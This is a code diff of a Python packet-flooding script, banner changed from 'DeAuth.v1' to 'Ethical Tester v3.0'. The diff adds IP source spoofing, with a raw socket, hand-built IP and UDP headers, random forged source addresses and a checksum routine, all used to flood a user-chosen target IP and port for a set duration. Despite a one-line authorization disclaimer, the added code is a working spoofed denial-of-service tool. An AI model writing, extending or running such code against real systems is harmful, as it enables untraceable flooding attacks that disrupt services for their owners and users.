@@ -1,5 +1,6 @@
 import socket
 import random
+import struct
 import time
 import colorama
 from colorama import Fore, Style
@@ -11,16 +12,12 @@ colorama.init(autoreset=True)
 print("\n" * 100)
 print(Fore.MAGENTA + Style.BRIGHT)
 print("""
-▓█████▄ ▓█████ ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ 
-▒██▀ ██▌▓█   ▀▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒
-░██   █▌▒███  ▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░
-░▓█▄   ▌▒▓█  ▄░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ 
-░▒████▓ ░▒████▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓
- ▒▒▓  ▒ ░░ ▒░ ░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒
- ░ ▒  ▒  ░ ░  ░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░
- ░ ░  ░    ░    ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░
-   ░       ░  ░     ░  ░   ░               ░  ░  ░
- ░                                DeAuth.v1                                        
+     8888   8888 8888888 88 8888888
+      8888 8888  88   88 88 88
+       8888888   88   88 88 88
+      8888 8888  88   88 88 88
+     8888   8888 8888888 88 8888888
+               Ethical Tester v3.0
 """)
 print(Fore.BLUE + "This tool is for authorized stress testing of public or private systems only.")
 print(Fore.RED + "Unauthorized use is illegal and unethical. Proceed only with explicit permission.")
@@ -33,6 +30,18 @@ def log_test(ip, port, duration, min_packet_size, max_packet_size):
             f"Target: {ip}, Port: {port}, Duration: {duration}s, Packet Size Range: {min_packet_size}-{max_packet_size} bytes, Time: {time.ctime()}\n"
         )
     print(Fore.GREEN + "[*] Test details logged.")
+
+# Function to generate random IP
+def random_ip():
+    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
+
+# Function to calculate checksum (used for IP headers)
+def checksum(data):
+    s = 0
+    for i in range(0, len(data), 2):
+        w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
+        s = (s + w) & 0xFFFF
+    return ~s & 0xFFFF
 
 # Get user input
 ip = input(Fore.BLUE + "Enter the target IP (public or private): " + Fore.MAGENTA)
@@ -62,23 +71,57 @@ if confirm.lower() != "yes":
 # Logging the test details
 log_test(ip, port, duration, min_packet_size, max_packet_size)
 
-# Create UDP socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-# Perform the stress test
+# Perform the stress test with spoofed IPs
 timeout = time.time() + duration
 sent = 0
-print(Fore.GREEN + "[*] Starting stress test with random packet sizes...")
+print(Fore.GREEN + "[*] Starting stress test with random packet sizes and IP spoofing...")
 try:
+    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
     while time.time() < timeout:
-        # Generate a random packet size within the specified range
+        # Generate random packet size within the range
         packet_size = random.randint(min_packet_size, max_packet_size)
         data = random._urandom(packet_size)
-        
+
+        # Generate a spoofed IP
+        source_ip = random_ip()
+
+        # Build IP header
+        ip_header = struct.pack(
+            "!BBHHHBBH4s4s",
+            69,  # Version and IHL
+            0,  # Type of Service
+            20 + len(data),  # Total Length
+            random.randint(0, 65535),  # Identification
+            0,  # Flags and Fragment Offset
+            64,  # TTL
+            socket.IPPROTO_UDP,  # Protocol
+            0,  # Header Checksum (will calculate later)
+            socket.inet_aton(source_ip),  # Source Address
+            socket.inet_aton(ip),  # Destination Address
+        )
+        ip_checksum = checksum(ip_header)
+        ip_header = struct.pack(
+            "!BBHHHBBH4s4s",
+            69, 0, 20 + len(data), random.randint(0, 65535), 0, 64, socket.IPPROTO_UDP,
+            ip_checksum,
+            socket.inet_aton(source_ip), socket.inet_aton(ip)
+        )
+
+        # Build UDP header
+        udp_header = struct.pack(
+            "!HHHH",
+            random.randint(1024, 65535),  # Source Port
+            port,  # Destination Port
+            8 + len(data),  # Length
+            0  # Checksum
+        )
+
         # Send the packet
-        sock.sendto(data, (ip, port))
+        sock.sendto(ip_header + udp_header + data, (ip, port))
         sent += 1
-        print(Fore.MAGENTA + f"[+] Sent {sent} packets of size {packet_size} bytes to {ip} on port {port}", end="\r")
+        print(Fore.MAGENTA + f"[+] Sent {sent} packets from {source_ip} to {ip} on port {port} (size: {packet_size} bytes)", end="\r")
 
     print(Fore.GREEN + f"\n[*] Test completed. Sent {sent} packets.")
 except Exception as e:
